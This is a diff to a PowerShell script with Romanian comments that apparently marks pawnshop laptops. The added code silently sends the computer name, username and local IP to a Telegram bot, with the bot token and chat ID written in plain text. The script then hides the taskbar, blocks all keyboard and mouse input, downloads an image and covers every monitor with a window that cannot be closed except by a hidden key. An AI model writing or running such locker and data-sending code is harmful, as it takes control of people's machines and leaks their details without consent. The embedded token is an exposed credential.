@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Cod nativ pentru input și taskbar
+# Cod nativ pt blocare și taskbar
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -15,10 +15,17 @@ public class Native {
 }
 "@
 
-# ▶️ TRIMITE MESAJ PE TELEGRAM
-$pcName = $env:COMPUTERNAME
-$message = "PC-ul $pcName din amanet este protejat."
+# ▶️ INFO TELEGRAM
+$pc = $env:COMPUTERNAME
+$user = $env:USERNAME
 
+# Ia IP-ul local (ignora 127.x sau fe80:)
+$ip = (Get-NetIPAddress -AddressFamily IPv4 `
+    | Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+
+$message = "PC-ul $pc + $user din amanet este protejat.`nAcesta este IP-ul PC-ului: $ip"
+
+# Trimite în Telegram
 $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
 $body = @{
     'chat_id' = '656189986'
@@ -27,22 +34,18 @@ $body = @{
 
 try {
     Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
-} catch {
-    # Nu afișăm eroarea, doar continuăm
-}
+} catch {}
 
-# ▶️ ASCUNDE TASKBAR
+# ▶️ Ascunde Taskbar și blochează input
 $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 [Native]::ShowWindow($taskbar, 0)
-
-# ▶️ BLOCHEAZĂ INPUT
 [Native]::BlockInput($true)
 
-# ▶️ DESCARCĂ POZA
+# ▶️ Descarcă imaginea
 $temp = "$env:TEMP\poza_laptop.jpg"
 Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
 
-# ▶️ CALCULEAZĂ DIMENSIUNE TOTALĂ A MONITOARELOR
+# ▶️ Calculează rezoluția tuturor monitoarelor
 $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
 $minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
 $minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
@@ -51,10 +54,10 @@ $maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum 
 $width = $maxRight - $minX
 $height = $maxBottom - $minY
 
-# ▶️ VARIABILĂ DE CONTROL
+# ▶️ Variabilă de control
 $script:inchis = $false
 
-# ▶️ CREARE FEREASTRĂ URIAȘĂ PESTE TOATE MONITOARELE
+# ▶️ Creează fereastra mare
 $form = New-Object Windows.Forms.Form
 $form.StartPosition = 'Manual'
 $form.Location = New-Object Drawing.Point $minX, $minY
@@ -73,7 +76,7 @@ $pb.Dock = 'Fill'
 $pb.SizeMode = 'Zoom'
 $form.Controls.Add($pb)
 
-# ▶️ IEȘIRE LA C
+# ▶️ Închide la C
 $form.Add_KeyDown({
     if ($_.KeyCode -eq 'C') {
         $script:inchis = $true
@@ -81,15 +84,14 @@ $form.Add_KeyDown({
     }
 })
 
-# ▶️ PREVINE ÎNCHIDEREA MANUALĂ
 $form.Add_FormClosing({
     if (-not $script:inchis) { $_.Cancel = $true }
 })
 
-# ▶️ ARATĂ ȘI RULEAZĂ
+# ▶️ Rulează aplicația
 $form.Show()
 [System.Windows.Forms.Application]::Run($form)
 
-# ▶️ DEBLOCHEAZĂ INPUT LA IEȘIRE
+# ▶️ Deblochează după închidere
 [Native]::BlockInput($false)
 [Native]::ShowWindow($taskbar, 1)
